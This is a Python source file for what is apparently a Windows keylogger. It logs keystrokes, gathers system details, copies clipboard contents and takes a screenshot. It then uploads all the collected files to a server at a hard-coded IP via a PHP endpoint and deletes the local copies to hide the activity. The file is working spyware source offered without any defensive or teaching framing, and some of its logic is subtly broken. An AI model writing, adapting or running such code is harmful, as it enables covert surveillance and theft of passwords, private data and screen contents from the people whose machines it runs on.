
from pynput.keyboard import Key, Listener
import socket
import platform
import requests

import win32clipboard

import os





from    requests import get

from PIL import ImageGrab




path="e:\\Progrmming\\Keylogger"
extend="\\"

logger="loggedkeys.txt"
sysinfo ="sysinfo.txt"
clipinfo ="clipboard.txt"
screen_shot="screenshot.png"



count=0
keys=[]
    

def press(key):
    global keys,count
    keys.append(key)
    count+=1

    print(key)

    if(count>=10):
        count=0
        write(keys)
        keys=[]


def write(keys):
    with open(path+extend+logger,"a") as f:
        for Key in keys:
            k=str(Key).replace("'","")
            if k.find("space") >0:
                k=" "
            if k.find("enter") >0:
                k="\n"
            f.write(k)





def release(key):
#     If esc is pressed exit the loop
    if key == Key.esc:
        return False


# keep listening to the keys that are being pressed
with Listener(on_press=press, on_release=release) as listener:
    listener.join()







# get all system information
def sysinformation():
        with open(path+extend+sysinfo,"a") as l:
            host = socket.gethostname()
            IPaddr = socket.gethostbyname(host)
            try:
                # use suitable api for IP but It'll still work without getting the IP
                publicIP =get("https://url-api-to-get-ip").txt
                l.write("public  IP Address : "+publicIP)
            except Exception:
                l.write(" couldn't get public IP"+'\n')
                l.write("processor: " +  (platform.processor())+'\n')
                l.write("System: " + platform.system()+ " "+ platform.version()+'\n')
                l.write("Machine: "+ platform.machine()+'\n')
                l.write("Hostname: "+host+'\n')
                l.write("Private IP Addr: "+IPaddr+'\n')




# get the contents of the keyboard
def clipboad_info():
    with open(path+extend+clipinfo,"a") as l:
        try:     
            win32clipboard.OpenClipboard()
            data=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            
            l.write("Clipboad Data:  \n"+ data)
        except:
            l.write("Copied data is either image or audio :)")





# take a S_shot :_
def screenshot():
    image=ImageGrab.grab()
    image.save(path+extend+screen_shot)



# functions called
clipboad_info()
sysinformation()
screenshot()


# uplaod the files to server check index.php for more details
def upload_files(file_list):
    URL = "http://192.168.1.14/keylogger/index.php"
    for file in file_list:
        with open(file, 'rb') as f:
            file_data = {'file': f}
            r = requests.post(URL, files=file_data)
            # if r.status_code == 200:
            #     print(f"File {file} successfully uploaded to the server.")
            # else:
            #     print(f"Failed to upload file {file} to the server.")

# delete the files created
def delete_files(file_list):
    
    for file in file_list:
        
        try:
            os.remove(file)
        except:
#             if file creation was successfull it will be an exception
            print("error deleting the files")



r_path=path+extend
file_list=[r_path+logger,r_path+clipinfo,r_path+sysinfo,r_path+screen_shot]

# functions called
upload_files(file_list)
delete_files(file_list)

